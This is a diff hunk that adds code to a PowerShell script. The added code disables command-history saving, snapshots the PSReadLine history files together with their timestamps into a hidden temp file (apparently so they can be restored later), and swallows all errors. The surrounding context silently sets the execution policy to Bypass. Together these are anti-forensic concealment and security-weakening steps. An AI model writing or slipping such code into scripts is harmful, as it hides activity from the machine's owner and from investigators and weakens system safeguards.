@@ -8,6 +8,39 @@ param(
     [string]$Choice
 )
 
+try {
+    Set-PSReadLineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue | Out-Null
+} catch {}
+
+function Save-MystHistorySnapshot {
+    $snap = @{}
+    $paths = @(
+        (Join-Path $env:APPDATA 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt')
+        (Join-Path $env:APPDATA 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
+        (Join-Path $env:APPDATA 'Microsoft\PowerShell\PSReadLine\ConsoleHost_history.txt')
+    )
+    foreach ($path in $paths) {
+        if (-not $path -or -not (Test-Path -LiteralPath $path)) { continue }
+        try {
+            $item = Get-Item -LiteralPath $path -Force
+            $snap[$path] = @{
+                BytesB64   = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($path))
+                CreatedUtc = $item.CreationTimeUtc.ToString('o')
+                WrittenUtc = $item.LastWriteTimeUtc.ToString('o')
+                AccessUtc  = $item.LastAccessTimeUtc.ToString('o')
+            }
+        } catch {}
+    }
+    if ($snap.Count -eq 0) { return }
+    try {
+        $file = Join-Path $env:TEMP ("wsh_{0}.bin" -f [guid]::NewGuid().ToString('N'))
+        $snap | ConvertTo-Json -Depth 4 -Compress | Set-Content -LiteralPath $file -Encoding UTF8 -Force
+        $env:_MYST_HIST_SNAP = $file
+    } catch {}
+}
+
+Save-MystHistorySnapshot
+
 foreach ($scope in @('Process', 'CurrentUser')) {
     try {
         Set-ExecutionPolicy -Scope $scope -ExecutionPolicy Bypass -Force -ErrorAction SilentlyContinue | Out-Null
